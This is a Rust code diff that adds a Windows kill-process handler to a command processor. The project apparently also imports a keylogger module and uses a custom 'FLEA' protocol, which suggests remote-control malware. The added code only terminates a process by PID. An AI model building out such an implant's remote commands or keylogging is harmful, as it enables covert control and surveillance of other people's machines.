@@ -16,6 +16,9 @@ use chrono::{DateTime, Utc};
 #[cfg(target_os = "windows")]
 use process_list::for_each_process;
 
+#[cfg(target_os = "windows")]
+use crate::windowsfunctions;
+
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
@@ -125,7 +128,40 @@ impl CommandProcessor
     #[cfg(target_os = "windows")]
     fn kill_process(&self, pid: &str) -> String
     {
-        "Not implemented".to_string()
+        use std::str::FromStr;
+
+        debug!("Executing kill process..");
+
+        match u32::from_str(pid)
+        {
+            Ok(num) =>
+            {
+                match windowsfunctions::WindowsProcess::open(num)
+                {
+                    Ok(x) =>
+                    {
+                        if let Ok(_) = x.kill()
+                        {
+                            debug!("Process killed");
+                            return "Ok".to_string();
+                        };
+                    },
+                    Err(y) =>
+                    {
+                        error!("{}", y);
+                        return y;
+                    }
+                }                    
+            },
+            Err(e) =>
+            {
+                return e.to_string();
+            }
+        }
+
+        error!("Process {} couldn't be killed.", pid);
+
+        "Couldn't kill the process".to_string()
     }
 
     /// Gets processes list (Linux version)
